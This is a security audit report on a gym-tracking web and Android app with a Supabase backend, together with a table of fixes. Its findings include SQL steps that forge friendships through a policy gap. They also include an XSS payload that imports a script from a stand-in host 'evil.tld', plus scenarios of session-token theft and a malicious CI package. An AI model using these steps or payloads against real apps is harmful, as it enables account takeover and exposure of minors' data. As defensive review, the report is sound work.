| MI-10 | Minor | Restore kept keys missing from the backup | Restore replaces all backup keys and resets sync bookkeeping |
| MI-11, N-1 | Minor/Nit | Postgres key order changed routine order and defeated equality checks | Routine order kept separately; comparisons use sorted-key JSON |
| N-2 | Nit | Rest "Skip" cleared every muscle group | Only the selected group |
| N-4 | Nit | Id-less, time-less sessions keyed differently from upstream | The upstream key is stored as the id |
| N-5 | Nit | weightTrend off by one across DST | Local calendar arithmetic |
| UX-M3 | Major | Keyboard sign-in left a stuck form | Settings re-renders on account changes regardless of focus; e2e test presses Enter |
| UX-M4 | Major | Stats consent copy understated what is shared | Copy, privacy notice and README list every shared field |
| UX-M5 | Major | "Remove my data" lost unsynced workouts | Removal only after a successful sync unless the user accepts the loss; network calls fail fast offline; e2e test |
| UX-M6 | Major | E2E tests could hit the live project | Playwright refuses to start without local Supabase, uses its own port, never reuses servers, and asserts a local config |
| UX-m1/m2 | Minor | Background refreshes dropped focus | render() patches the DOM in place (keyed rows); view changes replace; active bar updates in place; e2e test types during a background refresh |
| UX-m3/m4 | Minor | Sheets/workout screen focus handling | Sheets focus themselves, make everything behind inert and keep visual = tab order; workout screen moves focus in and restores it |
| UX-m5/m6/m7 | Minor | Double taps, stuck loading, no refetch | Pending states, optimistic replies with rollback, queued refresh, error with Try again, 60 s background refresh and reconnect catch-up |
| UX-m8..m11 | Minor | Chip overflow/swipe, teaser wording, "Can't" styling, badge contrast | Chips wrap and are no-swipe, wording fixed, distinct selected style, dark text on orange |
| UX-m13 | Minor | Ticking sets before Start | The first tick starts the timer |
| UX-m14 | Minor | Who is going hidden from screen readers | Screen-reader summary of going/maybe/at the gym |
| UX-m15 | Minor | Small destructive targets without undo | 44 px targets; Undo for removed exercises and weigh-ins |
| UX-m16..m20 | Minor | Android CI green without device, no forbidOnly, weak assertions, coverage gaps, overclaiming cache test | Missing device fails; forbidOnly, no retries; assertions tightened; new e2e suites (crew, flows, router/back); cache test covers every loaded file |
| UX-m21/m22 | Minor | Dev server path check, README setup | Separator-safe root check; README lists the Playwright install |
| UX nits (20) | Nit | Dead code, arrow keys, ranking text, toast case, double minus, label markup, duplicated logic, streak label, 9 px text, toast overlap, developer messages, README quote, empty restore, sign-out cancel, test error tracking, fixed sleep, CI timeout/double runs/artifacts, build cwd/versionCode, vitest include | All addressed (arrow-key model for tabs/radios/listboxes, shared helpers, 10–11 px minimum, user-facing wording, storage-flush polling in the Android test, CI timeouts and artifacts, script-relative paths, time-based local versionCode, separate DB test config) |

---

## Original review report (v2.9.1)

Snapshot reviewed: `/tmp/gym-orig` at commit `108ba0b` (version string 2.9.1). I only read the snapshot; nothing in it was modified. I ran the tests with `PYTHONDONTWRITEBYTECODE=1 python3 -B -m unittest discover -s tests` so that no `__pycache__` was written.

Line numbers refer to the snapshot. `cloud.js` is minified-style, so each of its lines holds a whole function, and a `cloud.js:N` reference names the function on that line. I checked every finding against the code. Anything that depends on server-side configuration I could not see (for example, Supabase Auth email-confirmation settings) is marked as unverified.

## Summary

| Severity | Count |
|---|---|
| Critical | 1 |
| High | 6 |
| Medium | 15 |
| Low | 12 |
| **Total** | **34** |

Top items:
1. **C1:** Any user can create an "accepted" friendship with any other user by rewriting `requester_id` in the friend-request UPDATE. That gives read access to the victim's body-weight history, full plans, shared workouts and stats.
2. **H1:** Stored, wormable XSS. A friend's shared workout or title is copied verbatim into the plan, then rendered with raw `innerHTML` in about ten sinks in `index.html`. In the APK, that lets an attacker steal the Supabase session.
3. **H2:** Users can't decline, cancel or unfriend: there is no DELETE policy and no UI for it. Every username is visible to every account. A minor cannot remove someone who can see their weight history.
4. **H3:** Sign-out leaves all local data on the device. The next account that signs in on it merges and uploads the previous user's logs, weigh-ins and plans.
5. **H5/H6:** The release signing key is committed with password `android` (and served publicly by GitHub Pages). The CI job runs unpinned npm/pip installs while holding a `contents: write` token, and it publishes the APK that the in-app updater installs.

## Checked and not a defect

- **The monkey-patch capture at `index.html:696-697`** (`window.startSession = startSession; window.renderToday = renderToday;`) looks stale, but it isn't. Both are top-level *function declarations* in a classic script, so they are properties of the global object. The later reassignments at `index.html:1797` and `:1982` therefore update `window.startSession` and `window.renderToday` too. `lastUsed`, `logs` and `WORKOUTS` are global lexical bindings, so every reader sees the reassigned Proxy. The patch-chain defects that *do* exist are in M6 (scroll side-effects) and M4 (unguarded lookups).
- **Time zones:** dates are generated and parsed consistently as local `YYYY-MM-DD` (`todayStr`, `parseDateStr`, `ymd`). Day arithmetic uses `new Date(y, m, d + i)`, which handles DST correctly. I found no time-zone defect. The only clock dependency is that log merging orders same-day sessions by device-local `time` (`index.html:713`), so clock skew between devices decides which one wins.
- **Plan editor escaping:** `plan.js` escapes every interpolated value (`esc()`, `plan.js:29`). `cloud.js` escapes usernames and titles. The XSS problem is limited to `index.html`.

---

## Critical

### C1: A friend-request recipient can rewrite `requester_id`, forging a friendship with any user
- **File:** `supabase/schema.sql:84-86` (with `:66`, the column-unrestricted `grant ... update ... on public.friend_requests`)
  ```sql
  create policy "Recipient accepts request" on public.friend_requests
    for update to authenticated using (target_id = auth.uid() and status = 'pending')
    with check (target_id = auth.uid() and status = 'accepted');
  ```
- **What's wrong:** The UPDATE policy constrains `target_id` and `status` only. `requester_id` can be set to anything, and the grant covers every column. Every profile `id` is readable by any authenticated user (`schema.sql:73-74`, `using (true)`).
- **Failure scenario:**
  1. The attacker creates a second account, B2, and sends a friend request from B2 to their main account B. The row is `(requester=B2, target=B, pending)`.
  2. B looks up the victim's id: `select id from profiles where username='victim'`.
  3. B runs `update friend_requests set requester_id='<victim id>', status='accepted' where id='<row>'`. `USING` passes on the old row and `WITH CHECK` passes on the new one.
  4. B and the victim are now "accepted friends". The victim never saw a request. B can read the victim's full `body_weight_logs` history (`schema.sql:134-142`), the full `workout_plans` JSON (`:118-126`), `shared_workouts` (`:88-96`) and `leaderboard_stats` (`:102-110`).

  This repeats for every user in the database. The users are likely minors, and the exposed data includes body weight.
- **Fix:** Restrict what the recipient can change. Either revoke column-level UPDATE and `grant update (status) on public.friend_requests to authenticated`, or replace the client UPDATE with a `security definer` RPC `accept_friend_request(id)` that only flips `status`. You can also add a trigger that rejects any change to `requester_id` or `target_id`. After the fix, audit existing `accepted` rows for forged pairs, for example rows where `created_at` predates the requester account or where the pair has no history.

---

## High

### H1: Stored, wormable XSS via friend-shared workouts copied into the plan
- **Source (another user's data):** `cloud.js:57`. The Copy handler stores friend-controlled JSON verbatim:
  `var name=prompt('Name this copy:',x.title); ... window.WORKOUTS[name]=x.workout||[]; localStorage.setItem('gymCustomWorkouts',...); window.dispatchEvent(new Event('gym:plan-changed'));`
  The DB only checks `jsonb_typeof(workout) = 'array'` and `char_length(title) between 1 and 80` (`schema.sql:21-22`). Any authenticated friend can insert rows directly through the REST API (`schema.sql:97-98`). The in-app share button doesn't exist (see M14), but that doesn't stop direct inserts.
- **Unescaped sinks** (all `innerHTML` or template-string HTML):
  - Exercise fields: `index.html:1011` `${ex.name}`, `:1014` `${ex.target}`, `:1015` `${ex.note}` in `startSession`. `.exercise-target`/`.exercise-note` are hidden by CSS (`:1418`), but the markup is still parsed and an `<img onerror>` still fires. Also `:1867` `'<b>' + e.name + '</b>…' + e.cat` in `openDa`, which runs on a single calendar tap.
  - Workout name (the prompt defaults to the friend's `title`): `:831` `${todaysWorkout}`, `:846` `next.name`, `:862` `${workout}`, `:1958` `w`, `:1242`/`:1891` `sch` in calendar cells, `:1255` `${session.day}`.
  - After a session is logged: `:1213` `${name}` and `:1208` `${h.w}`/`${h.r}` in stats, `:1257` `${ex.name}` and `:1259` `${s.w}`/`${s.r}` in day logs.
- **Failure scenario:** A friend (or anyone who used C1 to become one) inserts `shared_workouts(title:'Push day', workout:[{"name":"Bench<img src=x onerror=import('//evil.tld/p.js')>","sets":3}])`. The victim taps **Copy**, accepts the name and puts the routine on a day. Opening Today's workout or tapping that calendar day runs the payload. Because the copy is synced (`gym:plan-changed` → `syncPlan`), it runs on every one of the victim's devices.

  Inside the Capacitor WebView, the payload can read the Supabase refresh token from `localStorage` (a persistent account takeover) and exfiltrate all local logs and weights. Acting as the victim, it can insert a copy of itself into `shared_workouts`, which makes it a worm across friend graphs. It can also call native plugins.

  A ≤80-char title such as `<img src=x onerror=import('//e.tld/x')>` is enough for the name sinks. The friends list shows the title escaped, but the prompt pre-fills it.
- **Fix:** Escape at every sink in `index.html`. Add one `esc()` and use it in all template strings, or build nodes with `textContent` as `plan.js` already does. Validate and normalise copied workouts in `cloud.js:57`: keep only `{name:string≤80, cat:enum, sets:int 1-20, target:string≤20, rest:int, note:string≤200}`. Add a Content-Security-Policy `<meta>` (`script-src 'self' <pinned supabase>`; no inline handlers) as defence in depth. The inline scripts would need moving to files or hashing first.

### H2: Users can't decline, cancel or unfriend, and anyone can find and request anyone
- **File:** `supabase/schema.sql:80-86` (`friend_requests` has SELECT, INSERT and UPDATE policies but **no DELETE policy**), `:73-74` (profiles readable by all), `cloud.js:55` (the UI only renders "Accept"), `cloud.js:53` (`requestFriend` is an existence oracle: "Username not found.").
- **What's wrong:**
  - A pending request can't be declined. The requester can't withdraw it.
  - An accepted friendship can never be ended, and the friend keeps reading body-weight history and plans indefinitely.
  - There is no block, and no rate limit on requests.
  - Every authenticated account can list all usernames: `select username from profiles`.
  - The UI never lists accepted friends or outgoing requests by name. They only appear indirectly in the leaderboard.
- **Failure scenario:** A stranger signs up, runs `select username from profiles`, and sends requests to every user. The recipients (likely minors) can't dismiss them. One who taps Accept by mistake can't undo it, and the stranger can see their weigh-ins for as long as the account exists. The only remedy, per the README, is account deletion in the Supabase dashboard.
- **Fix:**
  - Add `create policy ... for delete to authenticated using (requester_id = auth.uid() or target_id = auth.uid())`, plus Decline, Cancel and Remove-friend buttons.
  - Show the friends list and outgoing requests explicitly.
  - Replace `profiles` `using (true)` with an exact-match lookup RPC (`find_profile(username) returns id`) so the directory can't be enumerated.
  - Add a per-user request rate limit (trigger or RPC) and a block table.

### H3: Sign-out leaves all data on the device, and the next account absorbs and uploads it
- **File:** `cloud.js:50` (`document.getElementById('signOut').onclick=function(){client.auth.signOut();};`), `cloud.js:35`, `:40-42`, `:45` (hydrate merges local into remote and uploads). No code path clears `gymLogs`, `gymLastUsed`, `bodyWeightLogs`, `gymCustomWorkouts` or `gymPlanSchedule`. The only `removeItem` calls are for the draft, active workout and rest image (`index.html:906`, `:1533`, `:1537`, `plan.js:67`).
- **Failure scenario:** Siblings share a tablet. A signs out and B signs in. `hydrate()` merges A's local logs, last-used values, plans and weigh-ins into B's cloud rows and upserts them. A's weigh-ins are now in B's `body_weight_logs`, which every one of B's friends can read (`schema.sql:134-142`). B's stats, leaderboard volume and plans are polluted, and A's data now persists on B's other devices.
- **Fix:**
  - On sign-out, ask "Remove this account's data from this device?" and, if yes, clear the app keys.
  - Store a `gymOwnerId` key. When a different user signs in, don't merge: offer "Start fresh" or "Import this device's data into <account>".
  - Never auto-merge local data into an account that differs from the last signed-in account.

### H4: Supabase JS is loaded from a CDN on a floating major version with no SRI, including inside the APK
- **File:** `index.html:2095` `<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>`. `tools/build-apk.sh:12` copies only the local files into `www/`, so the APK fetches this script remotely at every launch.
- **What's wrong:** `@2` resolves to whatever 2.x is newest (2.118.0 at review time). There is no `integrity=` attribute and no CSP. The script runs in the same origin as the app's `localStorage` (the session token, all health data) and, in the APK, alongside the Capacitor native bridge (`ApkUpdater`, `App`).
- **Failure scenario:** A malicious or compromised 2.x publish, a jsDelivr compromise, or a typo-squat redirect runs attacker code for every user on the next launch. Supply-chain attacks like this hit npm packages regularly. There is also an availability problem: when the CDN is unreachable, the account features show "Account sync unavailable" (`cloud.js:6`, `:50`).
- **Fix:** Vendor a pinned build of `supabase-js` into the repo, for example `vendor/supabase-js-2.x.y.min.js`. Load it locally, add it to the build copy list and record its hash. If a CDN must be used, pin the exact version and add `integrity` plus `crossorigin`.

### H5: The release signing key is committed with default passwords and published on GitHub Pages
- **File:** `android-signing/debug.keystore` (committed in `8dfa11d`). `tools/build-apk.sh:200-221` (`storePassword "android"`, `keyAlias "androiddebugkey"`, `keyPassword "android"`), `:237-246` (the build fails unless the APK is signed with this key). GitHub Pages serves the repo root, so the keystore is downloadable at `…github.io/gymapptest2/android-signing/debug.keystore`.
- **What's wrong:** Android trusts an update only if it's signed with the same key. This key, and its passwords, are public. The keystore's certificate is `CN=Rat Tracker, O=Personal, C=AT`, SHA-256 `B6:02:D0:7F:…:CC:37`.
- **Failure scenario:** Anyone can build `com.roguelineage.rattracker` with arbitrary code, sign it with this key, and spread it, for example as a "modded Tracker" APK passed between schoolmates. Android accepts it as an **update** over the genuine app. The update inherits the app's private data: the WebView `localStorage` with the Supabase refresh token, logs and weights. The in-app updater (`build-apk.sh:93-161`) adds no integrity beyond that signature, so the signature is the only control and it is void.
- **Fix:**
  - Generate a new release keystore that is never committed. Store it as base64 in GitHub Actions secrets with strong passwords, and sign `assembleRelease` with it.
  - Remove the keystore from the repo **and from history**, and treat it as compromised.
  - Changing the key forces one manual uninstall/reinstall. Ask users to back up first (see M12 on backup completeness).

### H6: CI gives a write-scoped token to a job that runs unpinned third-party install scripts, and publishes the auto-update artifact
- **File:** `.github/workflows/build-apk.yml:8-9` (`permissions: contents: write` for the whole workflow), `:19` (`actions/checkout@v4` persists `GITHUB_TOKEN` in `.git/config` by default), `:30-33` (runs the build script), `tools/build-apk.sh:19` (`npm install @capacitor/core@7 @capacitor/cli@7 …`, no lockfile, so it resolves the latest 7.x and transitive dependencies with install scripts), `:71` (`pip install pillow`, unpinned), `build-apk.yml:37-46` (deletes and recreates release `latest`), `:3-6` (`workflow_dispatch` with no branch restriction).
- **What's wrong:** Any compromised transitive npm or PyPI package runs a postinstall script while a write token sits on disk. That token can push to `main`, which GitHub Pages serves as the live web app, and can replace the `latest` release. `index.html:593`/`:626` and the Java plugin fetch exactly that release for the in-app update. Separately, a manual run from any branch publishes that branch's build as `latest` to every installed app.
- **Failure scenario:** One of the hundreds of transitive packages under `@capacitor/cli@7` is hijacked (an npm account takeover). Its postinstall step reads `.git/config`'s `extraheader` and pushes a backdoored `cloud.js` to `main`. The web app is compromised within minutes, and the next APK is too.
- **Fix:**
  - Split the work into a build job (`permissions: contents: read`, `persist-credentials: false`) and a separate publish job (`contents: write`) that only downloads the artifact.
  - Commit a `package-lock.json` and use `npm ci --ignore-scripts` where possible. Pin pip with hashes.
  - Pin actions by commit SHA.
  - Restrict publishing to `refs/heads/main`.
  - Publish versioned tags (`v2.9.1+<run>`) rather than overwriting `latest`.

---

## Medium

### M1: Deletions don't propagate. Deleted logs, weigh-ins and workouts come back
- **Logs:** `index.html:707-719`. The merge starts from *all* remote dates (`:709`) and only folds local data into dates that exist locally (`:710`). A date deleted locally (`:1272`, `delete logs[dateStr]`) but still present remotely is restored.
- **Weights:** `cloud.js:45` builds the union of remote and local, then `syncWeights` (`cloud.js:15`) upserts *every* local row. `cloud.js:22` deletes only on the current device.
- **Plans:** `cloud.js:12` unions `restoredWorkouts` from both sides and filters tombstones by it. `plan.js:107` removes a name from `restored` only locally, so once any device has a name in `restored`, a later deletion never sticks.
- **Failure scenarios:**
  - (a) The user deletes Tuesday's log while offline. The upload fails, and on the next launch `hydrate` merges the remote Tuesday back in.
  - (b) Phone A deletes a weigh-in to hide it from friends. Phone B still has it locally, and B's next hydrate re-upserts it, so friends see it again.
  - (c) The user deletes "Push", recreates it (`plan.js:151` adds it to `restored`), then deletes it again on phone A. Phone B still lists "Push" in `restored`, so B's next merge drops the tombstone and re-uploads "Push".
- **Fix:** Use explicit tombstones with timestamps for log dates/sessions, weigh-ins and workouts (`{deletedAt}`), and merge by per-record `updatedAt`. For weights, keep a `deletedWeights` set and delete server-side before upserting. Replace the `restored` set with per-workout `updatedAt` / `deletedAt`.

### M2: Whole-document last-writer-wins uploads, and local-wins merges
- **File:** `cloud.js:14` (`syncPlan` upserts the current device's full plan), `cloud.js:16` (`syncWorkoutData` upserts all logs and progress as one JSONB row), `cloud.js:12` (`Object.assign({}, remote.workouts, local.workouts)`: local always wins), `index.html:1576-1578` (`mergeWorkoutProgressFromCloud`: local wins for every key). Merges happen only inside `hydrate`.
- **Failure scenarios:**
  - (a) Phone A hydrated in the morning. Phone B logs Monday's session and uploads. Phone A then logs Tuesday's session and uploads a `logs` object without Monday, so Monday disappears from the cloud. If phone B is then reset before its next hydrate, Monday is gone for good.
  - (b) The user changes "Legs" on the tablet. The phone's next hydrate keeps the phone's stale "Legs" (local wins) and uploads it, overwriting the tablet's edit.
  - (c) Last-used kg/reps updated on phone B never reach phone A once A has that exercise key. A then overwrites the cloud with its stale values.
- **Fix:** Merge at record granularity: per-session ids with `updatedAt`, per-workout `updatedAt`, per-exercise `lastUsed.updatedAt`. Do a read-merge-write (or use an RPC that merges server-side) on every upload, not just at hydrate. At minimum, re-fetch and merge before each upload.

### M3: One out-of-range weigh-in permanently breaks all body-weight sync
- **File:** `index.html:1142` (`if (!val || val <= 0) return;`, no upper bound or rounding), `cloud.js:15` (all rows upserted in **one** batch), `schema.sql:45` (`numeric(6,2) ... check (weight_kg > 0 and weight_kg < 1000)`).
- **Failure scenario:** The user fat-fingers `755` as `7550`, or enters `0.004`, which rounds to `0.00`. The row violates the check or overflows. Every later `syncWeights` sends the whole list and the whole batch fails. The only sign is a status message, and the user can't tell which entry is at fault.
- **Fix:** Validate `20 ≤ kg ≤ 400` (or similar) and round to 0.1 at input. Have `syncWeights` skip and report invalid rows, or upsert row by row.

### M4: Crashes when the active workout is deleted or replaced during a session
- **File:** `index.html:1089` (`WORKOUTS[currentSessionDay].find(e => e.name === name).target` is unguarded), `index.html:981`/`:992` (`exercises.forEach` with `exercises` possibly undefined), `index.html:1783` (the active bar reopens `a.day`).
- **Failure scenarios:**
  - (a) A session for "Pull" is open. Another device deletes "Pull", and the hourly `TOKEN_REFRESHED` → `hydrate` → `saveLocalPlan` (`cloud.js:13`) replaces `WORKOUTS`. **Finish** throws a TypeError, nothing is saved, and the "Workout running" bar remains.
  - (b) The user closes a running session, deletes the workout in Plan (`plan.js:105`), then taps the "Workout running" bar. `startSession` throws, and the bar keeps showing for up to 12 hours (`index.html:1533`).
- **Fix:** Snapshot the exercise list at session start (`currentSessionExercises`) and use it in Finish and `meta()`. Guard `WORKOUTS[d]` in `startSession`. When the workout no longer exists, offer "save anyway" or "discard".

### M5: Copied friend workouts aren't validated, so a friend can cause a persistent crash or freeze
- **File:** `cloud.js:57` (stored verbatim; the name overwrites any existing workout of the same name without asking), `index.html:1002-1004` (`for (let s = 0; s < numSets; s++)` with `numSets = ex.sets`), `index.html:1540-1543` (the startup normalisation runs `e.name` on every element).
- **Failure scenarios:**
  - (a) Shared workout `[{"name":"x","sets":100000000}]`: opening it builds 10^8 table rows and the WebView hangs.
  - (b) `[null]`: after a reload, the second IIFE throws at `index.html:1542` (`e.name` of null) on every launch, which disables Start/Finish, the calendar, stats graphs and backup. Because the plan is synced, every device that hydrates inherits the crash.
  - (c) Naming the copy "Push" silently replaces the user's own "Push" routine.
  - (d) Copied exercises lack `rest`, so the rest bar shows `NaN:NaN` (`:1608`, `:1809`).
- **Fix:** Schema-validate and clamp on copy (see H1). Confirm before overwriting an existing name. Make the normalisation loop tolerate non-object entries.

### M6: `hydrate` runs twice at startup and again on every token refresh, with UI side-effects
- **File:** `cloud.js:63`: `client.auth.getSession().then(... if(user)hydrate() ...)` **and** `client.auth.onAuthStateChange(function(_,s){user=s&&s.user;render();if(user)hydrate();})`, which ignores the event type. `cloud.js:52`: `auth()` also calls `hydrate()` after sign-in.
- **What's wrong:** supabase-js v2 sends `INITIAL_SESSION` as soon as the listener subscribes, so startup hydrates twice concurrently. Sign-in hydrates twice (`auth()` plus `SIGNED_IN`). `TOKEN_REFRESHED` (about hourly) triggers a full merge and four upserts. Each hydrate then:
  - calls `saveLocalPlan` → `gym:plan-loaded` → `renderPlan` (`plan.js:170`), which replaces the plan editor DOM and loses a half-typed workout name, search text or a rep-target edit whose `change` hasn't fired;
  - calls `mergeWorkoutLogsFromCloud` → the patched `renderStats`, which runs `window.scrollTo(0, 0)` (`index.html:2024`), and the patched `renderCalendar`, which scrolls to the current month (`:1930-1932`). Both run whatever page is visible, so the user's scroll position jumps, and `cloud.js:45` calls `renderStats` again.
- **Fix:** Hydrate only on `INITIAL_SESSION` and `SIGNED_IN` when `user.id` changes. Drop the `getSession().then(hydrate)` path. Guard with an in-flight promise. Only re-render the page that is visible. Move the scroll calls into the nav handler, not the render function.

### M7: Friends get, and the client downloads, much more than the UI and README promise
- **File:** `schema.sql:134-142` (friends can read **all** weigh-ins), `cloud.js:56` (`body_weight_logs.select('user_id,weight_kg,log_date').in('user_id',ids).order(...)`, no limit, so every friend's full history is downloaded just to show one number), `schema.sql:118-126` (friends read the full plan JSON, including notes, schedule and the deleted/restored lists). README line 8: "Accepted friends can compare workout-plan summaries and latest body weight."
- **Failure scenario:** A user expects friends to see "latest weight". Any friend can read every weigh-in since sign-up with one query in the browser console.
- **Fix:** Expose a `friend_summary` view or RPC (`security definer`) that returns only the latest weight and the plan counts. Remove friend SELECT on the raw `body_weight_logs` and `workout_plans` tables. Consider making weight sharing a per-user opt-in, off by default for minors.

### M8: Sign-up with a taken username creates an account that can never sync
- **File:** `cloud.js:52` (no availability check before `signUp`), `cloud.js:31` (profile upsert uses `user_metadata.username`, and the failure only adds a warning), `schema.sql:4` (`username ... unique`), `:36`/`:43`/`:52` (every data table has an FK to `profiles`).
- **Failure scenario:** Bob signs up as `max`, which is already taken. Auth succeeds and the profile upsert fails on the unique constraint. Every later plan, weight or workout upsert fails the FK, so the user sees "Profile setup failed. Plan sync failed. …" on every launch. There is no UI to choose another username, and the next `hydrate` retries the same name.
- **Fix:** Check availability first through an RPC. Create the profile in a `handle_new_user` trigger on `auth.users` that suffixes the name on conflict. Add a "change username" control.

### M9: The password-reset flow can't actually set a new password
- **File:** `cloud.js:51` (`resetPasswordForEmail(..., {redirectTo:'https://roguelineageaccmanager.github.io/gymapptest2/'})`), `cloud.js:63`. Nothing handles the `PASSWORD_RECOVERY` event, and the app never calls `auth.updateUser({password})`.
- **Failure scenario:** The user taps "Forgot password". The email link opens the web app (never the APK), which signs them in with the recovery session and runs `hydrate`. They're never asked for a new password, so the APK stays signed out and they still can't sign in there.
- **Fix:** On `PASSWORD_RECOVERY`, show a new-password form that calls `updateUser`. Add an Android App Link or custom-scheme redirect for the APK.

### M10: The published APK is a debuggable debug build
- **File:** `tools/build-apk.sh:233` (`./gradlew assembleDebug`), `:234`.
- **What's wrong:** Debug builds set `android:debuggable=true`, and Capacitor turns on WebView remote debugging for debuggable builds. Anyone with USB access to an unlocked phone can attach `chrome://inspect` to the app, or use `adb shell run-as com.roguelineage.rattracker`, and read `localStorage`, which holds the session refresh token, logs and weights.
- **Failure scenario:** A classmate borrows the phone for a minute with developer options on, opens `chrome://inspect` from a laptop, and copies the refresh token, which gives persistent access to the account.
- **Fix:** Build and sign `assembleRelease` with a secret key (see H5) and set `webContentsDebuggingEnabled: false`.

### M11: "Delete this workout" deletes the whole day, and "log again" or restarting overwrites the earlier session
- **File:** `index.html:1272` (`delete logs[dateStr]`: every session on that date), `:1101-1104` (`findIndex(s => s.day === currentSessionDay)` → replace), `:1267` (`logAgainBtn` → `startSession(scheduled, dateStr)`), `:1948-1950` (after finishing today, the hero button reopens the same workout).
- **Failure scenarios:**
  - (a) The user logged "Push" and an extra "Abs" on the same date and deletes one from the day overview. Both are deleted.
  - (b) The user taps "Log this workout again" (or "Start workout" on today's finished card), enters a short second session and finishes. The first session's sets are overwritten without warning. The label suggests a second log.
  - (c) "Log again" uses the *current* schedule for that weekday (`scheduled`), not the workout actually logged that day.
- **Fix:** Give each session an id. Delete and edit a single session. For "again", either append or prefill from the existing record and confirm before replacing.

### M12: The backup leaves out plans, and restore is unvalidated and then undone by sync
- **File:** `index.html:1521` (`KEYS = ['gymLogs', 'gymLastUsed', 'bodyWeightLogs', 'gymBypass']`), `:2056-2066` (restore).
- **What's wrong:**
  - "Copy backup" excludes `gymCustomWorkouts`, `gymPlanSchedule`, `gymDeletedWorkouts`, `gymRestoredWorkouts`, `gymSidesFrom` and `gymRestImage`, so a restore after a reinstall loses every routine and the weekly schedule.
  - Restore writes `o[k]` with `localStorage.setItem` without checking the type or shape. An object value becomes `"[object Object]"`. Malformed but valid JSON (for example `gymLogs: '{"2026-01-01":"x"}'`) throws in `renderToday` (`:822`, `.some` on a string) and leaves the app blank. Keys missing from the backup are kept, despite the "Replace everything" prompt.
  - When signed in, the next `hydrate` merges cloud logs back (M1), so the "replace" is silently undone.
  - A backup received from someone else can carry XSS payloads into the raw sinks listed in H1.
- **Fix:** Include all app keys and a schema version. Validate the structure before writing. Clear keys missing from the backup. When signed in, ask whether the cloud should be replaced too.

### M13: Weight inputs are silently rounded to 5 kg (a 2 kg dumbbell is saved as 0)
- **File:** `index.html:968-973`: `const value = Math.max(0, Math.round((parseFloat(e.target.value) || 0) / 5) * 5); e.target.value = String(value);`, plus `step="5"` at `:931`.
- **Failure scenario:** The user enters `12` for dumbbell curls and it's saved as `10`. Entering `2` for lateral raises saves `0`. Entering `62.5` saves `60`. The logs, PR detection (`:1744`), stats graphs and leaderboard volume are all wrong, and there's no warning.
- **Fix:** Remove the rounding (or round to 0.25 or 0.5 kg) and use `step="any"`. The step could optionally be a per-exercise setting.

### M14: README privacy and feature claims contradict the code
- **File:** `README.md:7-10`, `:13`, `:21`, `:3`, `:28`.
- **What's wrong:**
  - "Workout logs, timers, and backups remain on this device" (`:7`) and "Workout history stays in browser storage" (`:21`) are false. `cloud.js:16`/`:37-42` sync all logs and last-used values to `workout_data` automatically when signed in.
  - "A workout is uploaded only after pressing **Share this workout with friends**" (`:9`). No such button exists: `window.cloudShareWorkout` (`cloud.js:59`) is never called anywhere.
  - "latest body weight" and "plan summaries" (`:10`) understate the exposure (see M7).
  - "The searchable catalog is fetched from the wger exercise API" (`:28`). `wger` appears nowhere in the code. The catalog is a hard-coded list (`plan.js:9-17`), so the attribution text is stale.
  - "remains usable offline" (`:3`). There is no service worker, so the GitHub Pages build isn't offline-capable beyond the HTTP cache. Only the APK bundles its files, and even there account features need the CDN script (H4).
- **Failure scenario:** A parent or user reads the README and believes workout history never leaves the device. It is uploaded on every change.
- **Fix:** Rewrite the "Data and privacy" section to describe what is actually synced and who can read it. Remove the wger and share-button claims, or implement them.

### M15: No age gate, consent, privacy notice or in-app deletion for an app likely used by minors
- **File:** `cloud.js:50` (the sign-up form asks for email, password and username only), `README.md:11` ("To remove a shared workout or stats, use Supabase's table editor … Deleting the account in Supabase removes related rows").
- **What's wrong:** Users can't delete their account, shared workouts or published stats themselves. There is no privacy notice and no age check. The app processes body weight, which is arguably health data, and shares it with other users. The backend is in the EU (Frankfurt), so GDPR's rules for children's consent (Art. 8) and the right to erasure (Art. 17) are relevant. Whether they actually apply to this personal project isn't a code question. Treat this as a risk to settle with whoever owns the project, not as a confirmed violation.
- **Failure scenario:** A 14-year-old wants their data gone. The only path is asking the developer to delete rows in the Supabase dashboard.
- **Fix:** Add "Delete my account and data", implemented as an RPC or Edge Function using the service role. Add delete controls for shared workouts and stats, a short privacy notice at sign-up, and opt-in (default off) sharing of weight with friends.

---

## Low

### L1: Usernames can be derived from the email address
- **File:** `cloud.js:31`: `username: user.user_metadata.username || user.email.split('@')[0].toLowerCase().replace(/[^a-z0-9_]/g,'_').slice(0,20)`.
- **Scenario:** For an account created without `username` metadata (by the dashboard, or a future OAuth sign-in), `max.mustermann2011@…` becomes the public username `max_mustermann2011`, which every user can read (H2). A local part shorter than 3 characters fails the regex check, and the profile is never created (M8).
- **Fix:** Generate a random handle and ask the user to choose one.

### L2: Leaderboard numbers are self-reported, and the "Refresh" button publishes
- **File:** `schema.sql:111-114` (the user can write any value), `cloud.js:54` (button label "Refresh"), `cloud.js:58` (`publishStats` upserts).
- **Scenario:** Anyone can set `workouts_count = 2147483647` with one REST call. Tapping "Refresh" to *see* friends' stats publishes your own, so the opt-in isn't informed.
- **Fix:** Label the button "Publish my stats" and show a separate reload. Compute stats server-side from `workout_data`, or treat them as untrusted.

### L3: The in-app updater's version detection and URL check are fragile
- **File:** `index.html:626-633` (parses `v\d+.\d+.\d+` from the release *title*), `build-apk.yml:41-46` (the title comes from `APP_VERSION`, and the release is replaced on every push), `build-apk.sh:112-117` (`url.startsWith(ALLOWED_PREFIX)` without normalising the URL).
- **Scenario:** Code ships to `main` without an `APP_VERSION` bump. The `latest` APK changes, but installed apps never offer it, because the title version equals `APP_VERSION`. Conversely, the web check at `index.html:585` uses `!==`, so a stale cached `Version` file prompts a "downgrade" reload. I didn't verify whether GitHub resolves `..` segments in a URL that passes the prefix check. The JS only ever passes the constant `APK_URL`, so this is hardening only.
- **Fix:** Use `versionCode` (the run number) in the tag, compare numerically, and parse and normalise the URL host and path in Java.

### L4: `.well-known/assetlinks.json` is stale and can't take effect
- **File:** `.well-known/assetlinks.json:5-6`. It names package `io.github.roguelineageaccmanager.twa` and fingerprint `FE:E1:44:…`, but the app is `com.roguelineage.rattracker` (`build-apk.sh:7`) and the keystore fingerprint is `B6:02:D0:…`. Digital Asset Links must also live at the domain root (`roguelineageaccmanager.github.io/.well-known/`), not under `/gymapptest2/`.
- **Fix:** Delete it, or move a corrected file to the user-site repo if App Links are wanted (also needed for M9).

### L5: The version string is duplicated in five places
- **File:** `Version:1`, `index.html:578`, `index.html:2096-2098` (three `?v=2.9.1` query strings). `build-apk.sh:224` and `build-apk.yml:41` scrape `index.html` with a regex. In the APK, `./Version` is bundled, so the 5-minute poll (`index.html:653`) can never find an update.
